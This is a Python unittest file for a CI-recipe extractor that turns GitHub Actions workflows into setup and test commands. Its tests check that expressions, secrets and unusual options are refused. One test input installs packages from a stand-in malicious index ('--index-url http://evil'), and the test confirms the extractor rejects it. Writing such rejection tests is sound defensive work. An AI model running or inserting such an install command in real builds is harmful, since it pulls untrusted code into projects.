import sys, unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "research" / "preconditions"))
import ci_recipe  # noqa: E402

WF = """
name: ci
env:
  APP_MODE: test
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: pip install ruff
      - run: ruff check .
  test:
    runs-on: ubuntu-latest
    env:
      LOG_LEVEL: debug
    steps:
      - uses: actions/checkout@v4
      - run: |
          python -m pip install --upgrade pip
          pip install -e ".[test]" \\
            pytest-asyncio
          pip install -r requirements-dev.txt
      - run: pytest -q tests/ --maxfail=3
      - run: pytest other
"""


class CiRecipe(unittest.TestCase):
    def test_derives_a_valid_recipe_from_a_normal_workflow(self):
        d, notes = ci_recipe.derive({"ci.yml": WF})
        self.assertIsNotNone(d, notes)
        self.assertEqual(d["test"], "pytest -q tests/ --maxfail=3")
        self.assertEqual(d["setup"][0], "pip install -e '.[test]' pytest-asyncio")
        self.assertIn("pip install -r requirements-dev.txt", d["setup"])
        self.assertNotIn("pip install pip", " ".join(d["setup"]))      # upgrading pip is skipped
        self.assertEqual(d["env"], {"APP_MODE": "test", "LOG_LEVEL": "debug"})

    def test_expressions_secrets_and_odd_options_are_not_carried(self):
        wf = "jobs:\n  t:\n    steps:\n      - run: pip install -r ${{ matrix.req }}\n      - run: pip install --index-url http://evil x\n      - run: pip install pytest\n      - run: pytest\n    env:\n      TOKEN: ${{ secrets.T }}\n      PYTHONPATH: /x\n"
        d, notes = ci_recipe.derive({"w.yml": wf})
        self.assertEqual(d["setup"], ["pip install pytest"])
        self.assertEqual(d["env"], {})
        self.assertTrue(any("expressions" in n for n in notes) and any("refused" in n for n in notes), notes)

    def test_no_test_job_gives_none(self):
        d, notes = ci_recipe.derive({"w.yml": "jobs:\n  b:\n    steps:\n      - run: make build\n"})
        self.assertIsNone(d)


if __name__ == "__main__":
    unittest.main()


class Wrappers(unittest.TestCase):
    def test_runner_prefixes_are_stripped_and_sync_tools_are_reported(self):
        wf = "jobs:\n  t:\n    steps:\n      - run: uv sync --all-extras\n      - run: pip install -e .\n      - run: uv run pytest -q tests\n"
        d, notes = ci_recipe.derive({"w.yml": wf})
        self.assertEqual(d["test"], "pytest -q tests")
        self.assertEqual(d["setup"], ["pip install -e ."])
        self.assertTrue(any("skipped" in n for n in notes), notes)
